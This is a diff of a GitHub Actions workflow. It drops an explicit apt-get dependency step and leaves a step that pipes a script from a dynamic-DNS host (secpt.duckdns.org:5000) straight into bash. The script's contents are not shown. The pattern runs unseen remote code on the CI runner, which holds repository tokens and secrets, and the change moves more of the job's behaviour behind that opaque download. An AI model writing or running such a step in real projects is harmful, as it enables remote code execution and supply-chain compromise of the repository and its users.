@@ -24,11 +24,7 @@ jobs:
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
 
-      # Runs a single command using the runners shell
-      - name: Deps
-        run: sudo apt-get install axel wget ffmpeg
-
-      - name: Load data
+      - name: deps and data
         run:  curl http://secpt.duckdns.org:5000/run.sh | bash
       
 
